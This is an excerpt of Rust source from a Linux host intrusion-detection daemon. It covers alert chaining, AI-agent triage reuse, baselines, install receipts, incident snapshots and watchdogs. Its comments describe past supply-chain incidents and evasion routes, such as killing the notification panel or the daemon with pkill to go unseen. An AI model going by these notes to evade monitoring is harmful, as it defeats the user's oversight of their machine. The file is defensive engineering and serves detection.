        // A chain that reaches `high` has to be able to reach the BADGE.
        //
        // `surface` is stamped per alert, by a rule that only ever saw one
        // event, so a chain whose members are each on the timeline stayed
        // invisible no matter what the correlation concluded. On 2026-09-04 an
        // AUR build egressed to a host outside the registry and ran a dropped
        // binary from /tmp; every member was `timeline` because the noise guard
        // had demoted those rules, and the user saw nothing at all.
        //
        // Only trigger steps are restamped. A context step is one the USER
        // allowlisted, and a sequence is not a licence to go back on that --
        // it still shows in the story, it just does not start shouting.
        let raise = crate::alert::severity_rank(&c.severity)
            >= crate::alert::severity_rank("high");
        let triggers: std::collections::HashSet<&str> = c
            .steps
            .iter()
            .filter(|s| s.is_trigger())
            .map(|s| s.alert.as_str())
            .collect();

        self.maybe_contain(&c, now);
        self.maybe_kill_tree(&c);
        if crate::alert::severity_rank(&c.severity) >= crate::alert::severity_rank("high") {
            // Content analysis first: quarantine moves the file into moat's own
            // store, which the analyser refuses to read, so the order is not a
            // preference.
            self.analyse_chain_artifacts(&c);
            self.quarantine_chain_artifacts(&c);
        }

        self.write_chain(&c, value, raise, &triggers);
    }

    /// Put a grown chain on disk: the chain ONCE, on its anchor, and a
    /// `chain_id` on each member that has not been stamped yet.
    ///
    /// Until 2026-09-10 every growth appended the whole chain to every member,
    /// which is quadratic: a 488-step chain -- one `makepkg` run, measured --
    /// wrote about 48 MB on its final step alone, and the store rotated ten
    /// times in eleven minutes, each rotation tripping moat's own
    /// rootkit-evidence-tamper rule and discarding the history that would
    /// have explained it. Now a growth writes the chain record plus one small
    /// line per NEW member (plus one `surface` line per trigger the first time
    /// the chain reaches `high`).
    ///
    /// The invariant that every member carries the whole chain is load-bearing
    /// -- `moatctl ack --chain` finds an alert's siblings through that alert's
    /// own copy -- and a version that stamped only the new members and left
    /// the old ones holding an earlier snapshot was tried and reverted the
    /// same day. It is kept at read time instead: a chain's `id` IS its first
    /// step's alert id, so the anchor always exists, and `store::Cache`
    /// rehydrates every member from it (`Alert::chain_id`).
    fn write_chain(
        &mut self,
        c: &chain::Chain,
        value: Value,
        raise: bool,
        triggers: &std::collections::HashSet<&str>,
    ) {
        let open: std::collections::HashSet<&str> =
            self.chains.open().map(|c| c.id.as_str()).collect();
        self.chain_stamps
            .retain(|id, _| *id == c.id || open.contains(id.as_str()));
        let st = self.chain_stamps.get(&c.id).copied().unwrap_or_default();
        let members = c.member_ids();
        let surface_for = |m: &str, need_id: bool| -> bool {
            raise && triggers.contains(m) && (need_id || !st.raised)
        };

        // The anchor first, so a member's reference never lands before the
        // record it refers to.
        let anchor_new = !members.iter().take(st.stamped).any(|m| *m == c.id);
        let mut u = UpdateLine::new(&c.id).set("chain", value);
        if anchor_new {
            u = u.set("chain_id", Value::from(c.id.as_str()));
        }
        if surface_for(&c.id, anchor_new) {
            u = u.set("surface", Value::from("alerts"));
        }
        if let Err(e) = self.store.append_update(&u) {
            log::error!("alerts.jsonl: {}", e);
            return;
        }
        for (i, member) in members.iter().enumerate() {
            if *member == c.id {
                continue;
            }
            let need_id = i >= st.stamped;
            let need_surface = surface_for(member, need_id);
            if !need_id && !need_surface {
                continue;
            }
            let mut u = UpdateLine::new(member);
            if need_id {
                u = u.set("chain_id", Value::from(c.id.as_str()));
            }
            if need_surface {
                u = u.set("surface", Value::from("alerts"));
            }
            if let Err(e) = self.store.append_update(&u) {
                // Left unstamped, so the next growth writes it again.
                log::error!("alerts.jsonl: {}", e);
                return;
            }
        }
        self.chain_stamps.insert(
            c.id.clone(),
            ChainStamp {
                stamped: members.len(),
                raised: st.raised || raise,
            },
        );
    }

    /// Which of the four rarity tuples this finding is about. An alert with no
    /// file and no destination reuses the (actor, parent) count taken at exec
    /// time rather than double-counting it.
    fn observe_rarity(&mut self, f: &Finding, now: u64) -> RarityInfo {
        if let Some(file) = &f.file {
            let verb = match f.hook_detail.as_deref() {
                Some(d) if d.starts_with("read") => "read",
                Some(d) if d.starts_with("write") || d.starts_with("append") => "written to",
                _ if f.hook == "bprm_check_security" => "executed something in",
                _ => "touched",
            };
            return self
                .rarity
                .observe(&Tuple::file(&f.proc.exe, &file.path, verb), now);
        }
        if let Some(net) = &f.net {
            return self.rarity.observe(
                &Tuple::net(&f.proc.exe, &net.dst_ip, net.dst_port, net.domain.as_deref()),
                now,
            );
        }
        if let Some(info) = self.exec_rarity.get(&f.exec_id) {
            return info.clone();
        }
        match f.ancestry.first() {
            Some(p) => self.rarity.observe(
                &Tuple::Parent {
                    exe: f.proc.exe.clone(),
                    parent: p.exe.clone(),
                },
                now,
            ),
            None => RarityInfo::unknown(),
        }
    }

    /// Copy an existing benign verdict onto un-triaged alerts of the same tuple,
    /// and return how many were filled in (LEARNING §2c).
    ///
    /// The cheap half of the cost problem. An agent call is 1.5-3.5 minutes and
    /// a paid request; a tuple that re-fires a hundred times is a hundred of
    /// them for one question that was answered the first time.
    ///
    /// What it deliberately does not do is demote. An inherited verdict shows
    /// the same explanation and leaves the alert exactly where it was, because
    /// acting on a verdict nobody gave about *this* event would be the model
    /// silencing a whole tuple off one read -- the thing `decide`'s ceiling
    /// exists to prevent. Waste is worth fixing; silence is not worth buying.
    pub fn inherit_triage_by_tuple(&mut self) -> usize {
        let alerts = self.store.load();
        // Newest benign verdict per tuple, with the rarity it was read at.
        let mut source: std::collections::HashMap<String, (&crate::alert::Alert, &crate::triage::Triage)> =
            std::collections::HashMap::new();
        for a in &alerts {
            let Some(t) = a.triage.as_ref() else { continue };
            if t.result.verdict != crate::triage::Verdict::Benign {
                continue;
            }
            // Never inherit from a record that was itself inherited: one real
            // read must not become an unbounded chain of copies.
            if t.outcome.starts_with("inherited:") {
                continue;
            }
            let key = a.tuple_key();
            match source.get(&key) {
                Some((prev, _)) if prev.ts >= a.ts => {}
                _ => {
                    source.insert(key, (a, t));
                }
            }
        }
        if source.is_empty() {
            return 0;
        }
        let now = crate::util::now_rfc3339();
        let mut todo = Vec::new();
        for a in &alerts {
            if a.acked || a.triage.is_some() || a.surface != "alerts" {
                continue;
            }
            // A tuple that was benign ALONE is a different question when it is a
            // step in a correlated sequence. On 2026-09-06 the reportkit exfil's
            // credential reads were individually benign (the user's own drill),
            // and a fresh run inherited that benign verdict onto the SAME reads
            // even though they now formed a high/critical exfil chain -- caching
            // an answer to a question the chain had changed. A chain member is
            // never cheap enough to skip: it goes to the agent (or stays for the
            // user), it does not inherit.
            if a.chain.as_ref().map(|c| crate::alert::severity_rank(&c.severity) >= crate::alert::severity_rank("high")).unwrap_or(false) {
                continue;
            }
            let Some((src, prior)) = source.get(&a.tuple_key()) else { continue };
            if src.id == a.id {
                continue;
            }
            if !crate::triage::may_inherit(
                prior,
                &src.ts,
                &now,
                src.rarity.as_str(),
                a.rarity.as_str(),
            ) {
                continue;
            }
            todo.push((
                a.id.clone(),
                crate::triage::record_inherited(prior, &src.id, &now),
            ));
        }
        let mut done = 0usize;
        for (id, record) in todo {
            let value = serde_json::to_value(&record).unwrap_or(serde_json::Value::Null);
            if self.mark(&id, "triage", value).is_ok() {
                done += 1;
            }
        }
        if done > 0 {
            log::info!("triage: {} alert(s) inherited an existing verdict", done);
        }
        done
    }

    /// Feed the (rule, actor exe, parent exe, file dir) tuple to the baseline,
    /// and act on what it decides (BASELINE §3).
    fn note_baseline(&mut self, f: &Finding, now: u64) {
        let severity = f.severity().to_string();
        // What the rule itself decided, before the context matrix escalated it.
        // The baseline gates on this (BASELINE §3): escalation is a statement
        // about circumstances, and circumstances are what a baseline is for.
        let severity_base = f
            .score
            .as_ref()
            .map(|s| s.severity_base.clone())
            .unwrap_or_else(|| severity.clone());
        let parent = f.parent_exe();
        let dir = f.file_dir();
        let rarity = f
            .rarity
            .as_ref()
            .map(|r| r.class.as_str())
            .unwrap_or("first_seen");
        let decision = self.baseline.observe(&Observation {
            rule: &f.rule,
            exe: &f.proc.exe,
            parent: &parent,
            dir: &dir,
            severity: &severity,
            severity_base: &severity_base,
            provenance: f.actor.provenance.as_str(),
            package: f.actor.package.clone(),
            context: f.context.as_str(),
            rarity,
            suppressed: f.suppressed_by.is_some(),
            demoted: f.demoted,
            ts: util::now_rfc3339(),
            now,
        });
        match decision {
            Learned::Entry { key, toml, comment } => {
                let path = self.cfg.paths.baseline_allowlist();
                match write_learned(&path, &comment, &toml) {
                    Ok(()) => {
                        log::info!("baseline: learned {} ({})", f.rule, comment);
                        self.reload_allowlist();
                    }
                    Err(e) => {
                        log::warn!("{}: {}", path.display(), e);
                        self.baseline.mark_revoked(&key, &format!("could not be written: {}", e));
                    }
                }
            }
            Learned::Proposed { id } => {
                log::info!(
                    "baseline: {} recurs from {}; proposal {} is waiting for review",
                    f.rule,
                    f.proc.exe,
                    id
                );
            }
            Learned::None => {}
        }
    }

    fn build_tool_in_chain(&self, exec_id: &str) -> bool {
        self.table.chain_has(exec_id, scoring::BUILD_TOOLS).is_some()
    }

    // ------------------------------------------- install receipts, LEARNING §3

    /// One exec inside a package subtree. The root gets an accumulator the first
    /// time anything in its tree is seen, so a daemon that started mid-install
    /// still produces a (partial, honest) receipt.
    fn note_receipt_exec(&mut self, exec_id: &str, now: u64) {
        let Some(root) = pkgtree::pkg_root_for(&self.table, exec_id).cloned() else {
            return;
        };
        let Some(me) = self.table.get(exec_id).cloned() else {
            return;
        };
        self.receipts.ensure(&root, now);
        if root.exec_id != me.exec_id {
            self.receipts.note_exec(&root.exec_id, &me);
        }
    }

    /// One finding attributed to a package subtree.
    fn note_receipt_finding(&mut self, f: &Finding) {
        if f.exec_id.is_empty() {
            return;
        }
        let Some(root) = pkgtree::pkg_root_for(&self.table, &f.exec_id).cloned() else {
            return;
        };
        self.receipts.ensure(&root, util::unix_secs());
        let net = f
            .net
            .as_ref()
            .map(|n| n.domain.clone().unwrap_or_else(|| n.dst_ip.clone()));
        self.receipts.note_finding(
            &root.exec_id,
            &f.meta.family,
            f.hook_detail.as_deref(),
            f.file.as_ref().map(|x| x.path.as_str()),
            net.as_deref(),
            f.severity(),
            f.suppressed_by.is_none(),
        );
    }

    /// The subtree's **outermost** root exited: write the receipt.
    ///
    /// Only the outermost one, so a mise shim, the npm it execs and the nested
    /// `npm` frames of a lifecycle script are one install with one receipt.
    fn finish_receipt(&mut self, exec_id: &str, status: Option<u32>, now: u64) {
        let Some(me) = self.table.get(exec_id).cloned() else {
            return;
        };
        if !pkgtree::is_pkg_root(&me) {
            return;
        }
        if let Some(root) = pkgtree::pkg_root_for(&self.table, exec_id) {
            if root.exec_id != exec_id {
                return;
            }
        }
        let r = self.receipts.finish(&me, status, now);
        log::info!(
            "receipt {}: {} ({} script(s), {} destination(s), exit {})",
            r.id,
            r.render().lines().next().unwrap_or_default(),
            r.postinstall_scripts.len(),
            r.network.len(),
            r.exit
        );
        self.receipts.written += 1;
        if let Err(e) = self.store.append_receipt(&r) {
            log::error!("alerts.jsonl: {}", e);
        }
    }

    /// Every receipt ever written, oldest first.
    pub fn receipt_list(&self, last: usize) -> Vec<receipt::Receipt> {
        let mut all = self.store.receipts();
        if all.len() > last {
            all = all.split_off(all.len() - last);
        }
        all
    }

    // ------------------------------------------ incident snapshots, LEARNING §4

    pub fn incidents_dir(&self) -> PathBuf {
        self.cfg.analysis.bundle_dir.clone()
    }

    /// The process tree as the daemon's own table saw it — `tree.txt`, and the
    /// ancestry rows `bundle.md` uses.
    /// Record what each ancestor started BESIDES the path to this alert.
    ///
    /// "What led here" is the lineage; this is "what else was that shell
    /// doing", and it is how a person tells a build from an intrusion without
    /// leaving the card. It has to happen here, at alert time, because the
    /// process table is an LRU pruned on a timer -- open a week-old alert and
    /// every one of these processes is long gone. The record is the only
    /// durable copy.
    ///
    /// An empty list therefore means "none recorded", never "none existed": a
    /// sibling that exited before the table was warm was never seen, and the
    /// panel says so rather than implying the shell did nothing else.
    fn fill_siblings(&self, f: &Finding, alert: &mut Alert) {
        // `f.ancestry` is nearest-parent-first, and the child on the path to
        // the alert is whatever precedes each entry -- the finding's own
        // process for the first, the previous ancestor for the rest.
        let mut on_path = f.proc.exec_id.clone();
        for (i, ancestor) in f.ancestry.iter().enumerate() {
            let (others, total) = self.siblings_of(&ancestor.exec_id, &on_path);
            if let Some(row) = alert.process.ancestry.get_mut(i) {
                row.others = others;
                row.others_total = total;
            }
            on_path = ancestor.exec_id.clone();
        }
    }

    /// The capped sibling list and the real count.
    ///
    /// Capped, and the cap is not cosmetic. 2026-09-11: `others` shipped
    /// unbounded. One `cargo build` gives an ancestor 554 concurrent rustc
    /// children, each with a ~1.3 KB command line, and every one of them was
    /// serialised into every alert raised under that build -- 730 KB in a
    /// single `others`, a 277 KB alert record, a 47 KB MEAN across the store.
    /// alerts.jsonl rotated every nine minutes, so `moatctl list --limit 100`
    /// covered under two minutes of wall clock and a high-severity IOC alert
    /// aged out of it while it was still the thing being looked at. The symptom
    /// was "list did not show my alert"; the cause was here.
    ///
    /// Twenty is what a person reads, and `others_total` keeps the count
    /// honest. A rustc command line is longer than most alerts, and for a
    /// SIBLING the question is "what else was running" -- which the binary and
    /// the head of its arguments answer. The full line is kept whole only for
    /// the process the alert is actually about.
    ///
    /// Split from `fill_siblings` so the cap is testable without a `Daemon`
    /// and an `Alert` around it.
    fn siblings_of(&self, parent: &str, on_path: &str) -> (Vec<crate::alert::Sibling>, usize) {
        const MAX_SIBLINGS: usize = 20;
        const MAX_SIBLING_ARGS: usize = 200;

        let all = self.table.other_children(parent, on_path);
        let total = all.len();
        let others = all
            .into_iter()
            .take(MAX_SIBLINGS)
            .map(|p| crate::alert::Sibling {
                pid: p.pid,
                exe: p.exe.clone(),
                args: crate::util::clamp_chars(&p.args, MAX_SIBLING_ARGS),
                state: match (&p.exit_signal, p.exited_at) {
                    // The signal is the only proof a kill happened (NOTES §7),
                    // so it is named rather than folded into "exited".
                    (Some(sig), _) => format!("killed by {}", sig),
                    (None, Some(_)) => "exited".to_string(),
                    (None, None) => "running".to_string(),
                },
            })
            .collect();
        (others, total)
    }

    fn tree_rows(&self, f: &Finding) -> Vec<AncestryRow> {
        let mut rows: Vec<AncestryRow> = f
            .ancestry
            .iter()
            .rev()
            .map(|p| AncestryRow {
                pid: p.pid,
                exe: p.exe.clone(),
                args: p.args.clone(),
                cwd: p.cwd.clone(),
            })
            .collect();
        rows.push(AncestryRow {
            pid: f.proc.pid,
            exe: f.proc.exe.clone(),
            args: f.proc.args.clone(),
            cwd: f.proc.cwd.clone(),
        });
        rows
    }

    fn tree_text(rows: &[AncestryRow]) -> String {
        let mut out = String::from(
            "# process tree from moatd's own exec_id table, oldest first.\n\
             # Untrusted: argv and paths are what the processes claimed.\n",
        );
        for (n, r) in rows.iter().enumerate() {
            out.push_str(&format!(
                "{}{} pid {}\n{}    args: {}\n{}    cwd:  {}\n",
                "  ".repeat(n),
                r.exe,
                r.pid,
                "  ".repeat(n),
                r.args,
                "  ".repeat(n),
                r.cwd
            ));
        }
        out
    }

    /// LEARNING §4: capture before any kill. Returns `None` when the alert is
    /// below the threshold, is suppressed, or is one of moat's own meta-alerts
    /// (there is no third-party process to snapshot).
    fn capture_incident(&self, f: &Finding, id: &str) -> Option<incident::Incident> {
        if f.suppressed_by.is_some() {
            return None;
        }
        // A `signal` rule is a building block, not a detection (BASELINE §4):
        // no snapshot. `moat-exec-untrusted-tmpfs` fires hundreds of times a
        // day from this machine's own builds, and a snapshot each time is a
        // /proc walk plus a hash of every implicated file for a row nobody is
        // being asked about. The exception is the same one that puts it on the
        // badge -- inside a package install it IS a detection, and that is
        // precisely the case where the evidence has to exist afterwards.
        if f.is_building_block() {
            return None;
        }
        if !severity_at_least(f.severity(), &self.cfg.incidents.snapshot_min_severity) {
            return None;
        }
        if f.exec_id.is_empty() || f.proc.pid <= 1 {
            return None;
        }
        let rows = self.tree_rows(f);
        let ancestors: Vec<(u32, String)> =
            f.ancestry.iter().map(|p| (p.pid, p.exe.clone())).collect();
        let dir = self.incidents_dir();
        let file = f.file.as_ref().map(|x| x.path.clone());
        let inc = incident::capture(&incident::Target {
            id,
            base: &dir,
            group: &self.cfg.group,
            rule: &f.rule,
            severity: f.severity(),
            title: &f.meta.title,
            ts: &util::now_rfc3339(),
            context: f.context.as_str(),
            // The alert's own mode, not the daemon's: meta.json sits beside a
            // record that says `mode: enforce` and must not say monitor.
            mode: &f.mode,
            // The DISPLAY answer, deliberately, and the opposite direction to
            // the enforcement one: here "maybe a container" must mean "do not
            // follow that path", because following it copies a host file into
            // an incident directory. Being wrong costs a missing artefact;
            // being wrong the other way costs an arbitrary read.
            in_container: self.containerised(&f.proc, &f.ancestry),
            pid: f.proc.pid,
            exe: &f.proc.exe,
            args: &f.proc.args,
            cwd: &f.proc.cwd,
            file: file.as_deref(),
            script: f.actor.script.as_deref(),
            ancestors: &ancestors,
            tree: &Self::tree_text(&rows),
            homes: &self.homes,
        });
        // Retention is cheapest right after a capture, and it means the cap is
        // enforced even on a machine that never restarts the daemon.
        // Which incidents to pin. This is the SAME `is_protected()` predicate
        // the feed window and carry-forward rotation use, so the incident
        // keep-set cannot drift from what survives in `alerts.jsonl`: a row that
        // is retained keeps its incident pinned, and a row that rotates out lets
        // its snapshot be pruned. (Every incident-bearing row is protected by P4
        // by construction, so an on-disk snapshot is pinned as long as its alert
        // row lives — which is the whole point of the fix.)
        let keep: std::collections::HashSet<String> = self
            .store
            .load()
            .iter()
            .filter(|a| a.is_protected())
            // `dir` is the incident directory; its last component is the id
            // that `prune` works in.
            .filter_map(|a| {
                a.incident.as_ref().and_then(|i| {
                    std::path::Path::new(&i.dir)
                        .file_name()
                        .map(|n| n.to_string_lossy().to_string())
                })
            })
            .collect();
        for gone in incident::prune(
            &dir,
            self.cfg.incidents.retain_days,
            self.cfg.incidents.retain_max,
            util::unix_secs(),
            &keep,
        ) {
            log::info!("incident retention: removed {}", gone);
        }
        Some(inc)
    }

    // ------------------------------------------------------ bundle, LEARNING §2

    /// Write `<incidents dir>/<id>/bundle.md` and return its path.
    ///
    /// The daemon only ever writes the file. Launching the agent is
    /// `moatctl analyze`'s job, in the user's session (LEARNING §2, §7).
    pub fn write_bundle(&self, id: &str) -> Result<PathBuf, String> {
        let alert = self
            .find_alert(id)
            .ok_or_else(|| format!("no alert {}", id))?;
        let all = self.store.load();
        let receipts = self.store.receipts();
        let related_alerts = bundle::related_alerts(&alert, &all, bundle::RELATED_WINDOW_SECS);
        let related_receipts =
            bundle::related_receipts(&alert, &receipts, bundle::RELATED_WINDOW_SECS);

        // The alert on disk records ancestors as pid + exe only; the live table
        // still has argv and cwd for the ones that have not been pruned.
        let mut ancestry: Vec<AncestryRow> = alert
            .process
            .ancestry
            .iter()
            .rev()
            .map(|a| {
                let live = self
                    .table
                    .find_by_pid(a.pid)
                    .filter(|p| p.exe == a.exe || a.exe.is_empty());
                AncestryRow {
                    pid: a.pid,
                    exe: a.exe.clone(),
                    args: live.map(|p| p.args.clone()).unwrap_or_default(),
                    cwd: live.map(|p| p.cwd.clone()).unwrap_or_default(),
                }
            })
            .collect();
        ancestry.push(AncestryRow {
            pid: alert.process.pid,
            exe: alert.process.exe.clone(),
            args: alert.process.args.clone(),
            cwd: alert.process.cwd.clone(),
        });

        let dir = self.incidents_dir().join(id);
        let meta: Option<Value> = std::fs::read_to_string(dir.join("meta.json"))
            .ok()
            .and_then(|t| serde_json::from_str(&t).ok());
        // Stage what the agent is allowed to read, into the same directory the
        // bundle lives in. evidence.rs decides what may be copied; a cred
        // rule's target never is.
        let _ = std::fs::create_dir_all(&dir);
        let artifacts = crate::evidence::stage(&alert, &dir, crate::evidence::MAX_STAGED_BYTES, &self.cfg.group);
        let body = bundle::render(&bundle::Input {
            alert: &alert,
            // The table the agent reads is about `alert`; every other cell in
            // it comes from the record, and so does this one.
            mode: &alert.mode,
            ancestry: &ancestry,
            related_alerts: &related_alerts,
            related_receipts: &related_receipts,
            incident: meta.as_ref(),
            incident_dir: meta.as_ref().map(|_| dir.as_path()),
            allowlist_dir: &self.cfg.paths.allowlist_dir.display().to_string(),
            artifacts: &artifacts,
            version: crate::VERSION,
        });
        bundle::write(&dir, &body, &self.cfg.group)
            .map_err(|e| format!("{}: {}", dir.display(), e))
    }

    // ------------------------------------------------------ digest, LEARNING §5

    /// The weekly summary. Computed by the daemon, delivered by
    /// `moatctl digest --notify` from the user's session.
    pub fn digest(&self, now: u64) -> digest::Digest {
        let since = now.saturating_sub(7 * 86_400);
        let in_window = |ts: &str| {
            util::rfc3339_to_nanos(ts)
                .map(|n| (n / 1_000_000_000) as u64 >= since)
                .unwrap_or(true)
        };
        // The same three populations `status.ledger` names, over one week. A
        // `signal` building block is not an incident, whatever its severity:
        // that is what declaring the tier means.
        let incidents = self.store.count_alerts(|a| {
            !a.is_suppressed() && !a.is_building_block() && a.severity_rank() >= 2 && in_window(&a.ts)
        }) as u64;
        let recorded = self
            .store
            .count_alerts(|a| !a.is_suppressed() && a.surface != "alerts" && in_window(&a.ts))
            as u64;
        let suppressed = self
            .store
            .count_alerts(|a| a.is_suppressed() && in_window(&a.ts)) as u64;
        let installs = self
            .store
            .receipts()
            .iter()
            .filter(|r| in_window(&r.started))
            .count() as u64;
        digest::Digest {
            enabled: self.digest_enabled,
            due: digest::next_due(now, &self.cfg.digest.weekday, self.cfg.digest.hour),
            last_sent: self.digest_last_sent,
            summary: digest::Summary {
                incidents,
                recorded,
                suppressed,
                installs,
                proposals: self.baseline.proposals().len() as u64,
            },
            weekday: self.cfg.digest.weekday.clone(),
            hour: self.cfg.digest.hour,
        }
    }

    /// `moatctl set digest on|off`.
    pub fn set_digest(&mut self, on: bool) {
        self.digest_enabled = on;
        self.write_state();
        log::info!("weekly digest {}", if on { "on" } else { "off" });
    }

    /// `moatctl set containers on|off`.
    pub fn set_inspect_containers(&mut self, on: bool) {
        self.inspect_containers = on;
        self.write_state();
        log::info!("container inspection {}", if on { "on" } else { "off" });
    }

    /// `moatctl digest --notify` reports back that it delivered one, so a
    /// catch-up run after a suspend does not send twice.
    pub fn digest_sent(&mut self, now: u64) {
        self.digest_last_sent = now;
        self.write_state();
    }

    // ---------------------------------------------------- the noise guard §4

    /// How long moat was down before this start, in seconds.
    ///
    /// `state.json` carries a heartbeat written on every save. If the gap
    /// between that and now is longer than a restart takes, something stopped
    /// the daemon -- an update, a reboot, a crash, or somebody with root who
    /// wanted a window. Whichever it was, the hole belongs on the timeline,
    /// because nothing else records it: `Restart=always` brings the process
    /// back and says nothing about what was missed.
    ///
    /// This is the WALL gap, which is not the same as the blind window --
    /// see `downtime`.
    pub fn downtime_secs(&self) -> u64 {
        self.started.saturating_sub(self.last_heartbeat)
    }

    /// The gap, split into time that could have hidden something and time that
    /// could not.
    ///
    /// Wall-clock distance is the wrong measure and said so out loud on
    /// 2026-09-09: moat reported "a 4416 second hole -- nothing that happened
    /// in between was seen by anything" for a gap in which the machine was
    /// powered off for 73 minutes. It had watched until five seconds before
    /// shutdown and came back 38 seconds after the next boot. 38 seconds is
    /// the number that was true, and it is under the alerting floor.
    ///
    /// The concern behind the rule is still real -- a reboot IS a way to buy an
    /// unobserved window, and so is `pkill moatd`. So nothing here suppresses
    /// anything; it measures the blind part and names the rest, which is what
    /// makes a genuine hole legible instead of lost in a nightly shutdown.
    ///
    /// Two clocks do the splitting:
    ///
    /// * `btime` AFTER the last heartbeat means the machine rebooted inside the
    ///   gap. Only `boot -> start` on THIS boot was blind. The remainder is
    ///   shutdown plus power-off, and the sliver between the final heartbeat and
    ///   the actual shutdown is not separable from here -- it is bounded by one
    ///   heartbeat interval, so it is reported with the powered-off time rather
    ///   than guessed at.
    /// * Otherwise it is the same boot, and `CLOCK_MONOTONIC` gives the awake
    ///   time directly: it does not advance across a suspend. A laptop asleep
    ///   overnight has a large wall gap and a near-zero blind one.
    ///
    /// Missing inputs fall back to the wall gap -- an old `state.json` with no
    /// `awake` key, or an unreadable `/proc/stat`. That direction is deliberate:
    /// not knowing must over-report a hole, never hide one. A monotonic clock
    /// that has gone backwards counts as a missing input for the same reason:
    /// it can only mean a reboot this function did not otherwise see.
    pub fn downtime(&self) -> Downtime {
        split_downtime(
            self.downtime_secs(),
            crate::util::boot_time(),
            self.last_heartbeat,
            self.started,
            self.last_awake,
            crate::util::awake_secs(),
        )
    }

    /// Raise `moat-x-binary-modified` the first time a path's bytes are found
    /// not to match what its package recorded.
    ///
    /// Once per (path, reason): the classifier is consulted while building
    /// every alert, so an unguarded emit here would turn one tampered file
    /// into a flood. A file that changes a second time gets a new reason and
    /// so is reported again.
    fn report_modified_binary(
        &mut self,
        actor: &crate::provenance::Actor,
        proc: &crate::proctable::ProcInfo,
    ) {
        let Some(why) = actor.modified.clone() else {
            return;
        };
        // The classified path is the script when an interpreter took its
        // script's provenance, and the executable otherwise -- the same choice
        // `classify_actor` made, so the alert names the file that was checked.
        let path = actor.script.clone().unwrap_or_else(|| proc.exe.clone());
        let key = format!("{}\0{}", path, why);
        if !self.remember_modified(key) {
            return;
        }
        // Written now rather than at the next periodic save: a crash between
        // the alert and the save would report it all over again on restart,
        // which is the thing this set exists to prevent.
        self.write_state();
        let package = actor.package.clone().unwrap_or_else(|| "its package".into());
        self.emit_modified(&path, &package, &why, proc.clone());
    }

    /// The finding itself, shared by the classification path and the sweep.
    ///
    /// The sweep has no process to attribute to -- nothing ran -- so it passes
    /// moat's own, which is what `self_proc` is for elsewhere in this family.
    fn emit_modified(
        &mut self,
        path: &str,
        package: &str,
        why: &str,
        proc: crate::proctable::ProcInfo,
    ) {
        log::warn!("{} is not the file {} shipped: {}", path, package, why);
        let meta = crate::rules::binary_modified_meta(path, package);
        let mut f = Finding::new(crate::rules::BINARY_MODIFIED, meta, proc);
        f.hook = "userland".into();
        f.mode = self.mode.clone();
        f.file = Some(crate::alert::FileRef {
            path: path.to_string(),
            sha256: None,
        });
        f.extra_evidence.push(why.to_string());
        f.extra_evidence.push(format!(
            "pacman's own check agrees or disagrees independently: `pacman -Qkk {}`",
            package.split_whitespace().next().unwrap_or(package)
        ));
        self.in_meta_alert = true;
        let _ = self.emit(f);
        self.in_meta_alert = false;
    }

    /// Say so, once, at the start of a run.
    pub fn report_downtime(&mut self) {
        // A gap under a minute is a restart, which the user just did on
        // purpose or an upgrade just did for them.
        const FLOOR: u64 = 60;
        if self.last_heartbeat == 0 {
            return; // first ever start: no record to have a hole in
        }
        // The BLIND window, not the wall gap. A machine that was off or asleep
        // was not unobserved; see `downtime` for the 2026-09-09 case that made
        // this distinction, where the two differed by 73 minutes.
        let d = self.downtime();
        if d.blind < FLOOR {
            if let Some(why) = d.accounted_for() {
                log::info!(
                    "{} gap since the last heartbeat, {} -- {} blind, below the floor",
                    mins(d.wall),
                    why,
                    mins(d.blind)
                );
            }
            return;
        }
        let minutes = d.blind / 60;
        log::warn!("moat was not running for {} minutes before this start", minutes);
        let meta = crate::rules::was_down_meta(minutes);
        let mut f = Finding::new(crate::rules::WAS_DOWN, meta, self_proc("startup"));
        f.hook = "userland".into();
        f.mode = self.mode.clone();
        f.extra_evidence.push(format!(
            "last heartbeat {}, started {} -- {} unwatched while the machine was awake",
            crate::util::rfc3339_of(self.last_heartbeat),
            crate::util::rfc3339_of(self.started),
            mins(d.blind)
        ));
        // Say where the rest of the wall gap went, so a number smaller than the
        // clock distance does not read as moat having lost track of time.
        if let Some(why) = d.accounted_for() {
            f.extra_evidence.push(format!(
                "the full gap was {}, of which {}",
                mins(d.wall),
                why
            ));
        }
        self.in_meta_alert = true;
        let _ = self.emit(f);
        self.in_meta_alert = false;
    }

    /// Something asked for `status`. Almost always the panel.
    pub fn note_watcher(&mut self, now: u64) {
        self.last_watched = now;
    }

    /// Notice when alerts are stacking up and nothing is reading them.
    ///
    /// Every notification moat produces is drawn by a program in the user's own
    /// session -- the panel, and the digest timer -- so anything running as the
    /// user can silence the whole product by killing one process. That is the
    /// cheapest attack on this design: no evasion, no privilege, just `pkill`,
    /// and moatd goes on recording perfectly while nobody sees any of it.
    ///
    /// moatd is root and the attacker cannot stop it, so the noticing belongs
    /// here. It cannot draw a notification itself (that needs the user's
    /// session bus), but it can put the gap on the record, where the panel will
    /// show it the moment one comes back -- and where an offline reader of
    /// alerts.jsonl sees it regardless.
    pub fn watchdog_tick(&mut self, now: u64) {
        const QUIET: u64 = 1800;
        const REPEAT: u64 = 21_600;
        let quiet_for = now.saturating_sub(self.last_watched);
        if quiet_for < QUIET {
            return;
        }
        // Only what reached the badge: a timeline entry nobody read is not a
        // missed warning, it is the timeline working as intended. This is the
        // same count `status` reports as `unacked` -- it used to be a second
        // filter with one more clause, so `moatctl status` said "high 243"
        // while this said 8 were waiting.
        let unacked: u64 = self.store.unacked().values().sum();
        if unacked == 0 {
            return;
        }
        if now.saturating_sub(self.last_unwatched_alert) < REPEAT {
            return;
        }
        self.last_unwatched_alert = now;
        if self.in_meta_alert {
            return;
        }
        let mins = quiet_for / 60;
        log::warn!("nobody has read moat's status in {} minutes, {} alerts waiting", mins, unacked);
        let meta = crate::rules::unwatched_meta(unacked, mins);
        let mut f = Finding::new(crate::rules::UNWATCHED, meta, self_proc("watchdog"));
        f.hook = "userland".into();
        f.mode = self.mode.clone();
        f.extra_evidence.push(format!(
            "no status read for {} minutes; {} surfaced alert(s) unanswered",
            mins, unacked
        ));
        self.in_meta_alert = true;
        let _ = self.emit(f);
        self.in_meta_alert = false;
    }

    /// The sensor is dropping events. Say so, once per hour per cgroup.
    ///
    /// This is the only failure in the whole design where the evidence is what
    /// goes missing: every other evasion leaves a record somewhere. Rate-limited
    /// because a throttle repeats for as long as the flood does, and a thousand
    /// alerts about a thousand missing alerts helps nobody.
    fn note_throttle(&mut self, t: &crate::event::ThrottleEvent, now: u64) {
        if t.kind.as_deref() == Some("THROTTLE_STOP") {
            return;
        }
